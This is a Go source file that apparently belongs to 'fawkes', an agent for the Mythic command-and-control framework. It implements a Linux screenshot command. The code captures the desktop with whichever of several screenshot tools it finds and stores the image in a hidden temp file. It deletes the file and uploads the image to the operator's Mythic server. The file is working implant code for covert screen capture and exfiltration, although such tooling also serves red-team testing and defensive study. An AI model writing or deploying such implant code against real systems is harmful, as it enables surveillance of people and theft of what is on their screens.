//go:build linux

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"fawkes/pkg/structs"
)

// ScreenshotLinuxCommand implements screenshot for Linux using available X11 tools
type ScreenshotLinuxCommand struct{}

func (c *ScreenshotLinuxCommand) Name() string {
	return "screenshot"
}

func (c *ScreenshotLinuxCommand) Description() string {
	return "Capture a screenshot of the desktop (Linux X11/Wayland)"
}

func (c *ScreenshotLinuxCommand) Execute(task structs.Task) structs.CommandResult {
	// Check for display server
	display := os.Getenv("DISPLAY")
	waylandDisplay := os.Getenv("WAYLAND_DISPLAY")

	if display == "" && waylandDisplay == "" {
		return structs.CommandResult{
			Output:    "No display server detected (DISPLAY and WAYLAND_DISPLAY not set). Screenshot requires a graphical session.",
			Status:    "error",
			Completed: true,
		}
	}

	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".sc_%d.png", time.Now().UnixNano()))

	// Try screenshot tools in order of preference
	var err error
	if waylandDisplay != "" {
		// Wayland: try grim first, then gnome-screenshot
		err = tryScreenshotTools(tmpFile, []screenshotTool{
			{"grim", []string{tmpFile}},
			{"gnome-screenshot", []string{"-f", tmpFile}},
		})
	} else {
		// X11: try several tools
		err = tryScreenshotTools(tmpFile, []screenshotTool{
			{"import", []string{"-window", "root", tmpFile}},
			{"scrot", []string{tmpFile}},
			{"gnome-screenshot", []string{"-f", tmpFile}},
			{"xfce4-screenshooter", []string{"-f", "-s", tmpFile}},
		})
	}

	if err != nil {
		os.Remove(tmpFile)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Screenshot failed: %v\nEnsure a screenshot tool is installed (import/scrot/gnome-screenshot for X11, grim for Wayland)", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Read the screenshot file
	imgData, err := os.ReadFile(tmpFile)
	if err != nil {
		os.Remove(tmpFile)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading screenshot file: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Clean up temp file
	os.Remove(tmpFile)

	if len(imgData) == 0 {
		return structs.CommandResult{
			Output:    "Screenshot captured but file was empty (no display available?)",
			Status:    "error",
			Completed: true,
		}
	}

	// Send screenshot to Mythic
	screenshotMsg := structs.SendFileToMythicStruct{}
	screenshotMsg.Task = &task
	screenshotMsg.IsScreenshot = true
	screenshotMsg.SendUserStatusUpdates = false
	screenshotMsg.Data = &imgData
	screenshotMsg.FileName = fmt.Sprintf("screenshot_%d.png", time.Now().Unix())
	screenshotMsg.FullPath = ""
	screenshotMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- screenshotMsg

	// Wait for transfer to complete
	for {
		select {
		case <-screenshotMsg.FinishedTransfer:
			return structs.CommandResult{
				Output:    fmt.Sprintf("Screenshot captured and uploaded (%d bytes)", len(imgData)),
				Status:    "success",
				Completed: true,
			}
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return structs.CommandResult{
					Output:    "Screenshot upload cancelled",
					Status:    "error",
					Completed: true,
				}
			}
		}
	}
}

type screenshotTool struct {
	name string
	args []string
}

// tryScreenshotTools attempts each tool in order, returning nil on first success.
func tryScreenshotTools(tmpFile string, tools []screenshotTool) error {
	var lastErr error
	for _, tool := range tools {
		path, err := exec.LookPath(tool.name)
		if err != nil {
			lastErr = fmt.Errorf("%s not found", tool.name)
			continue
		}
		cmd := exec.Command(path, tool.args...)
		cmd.Env = os.Environ()
		if output, err := cmd.CombinedOutput(); err != nil {
			lastErr = fmt.Errorf("%s failed: %v (%s)", tool.name, err, string(output))
			continue
		}
		// Verify the file was created
		if fi, err := os.Stat(tmpFile); err == nil && fi.Size() > 0 {
			return nil
		}
		lastErr = fmt.Errorf("%s ran but produced no output file", tool.name)
	}
	if lastErr != nil {
		return lastErr
	}
	return fmt.Errorf("no screenshot tools available")
}
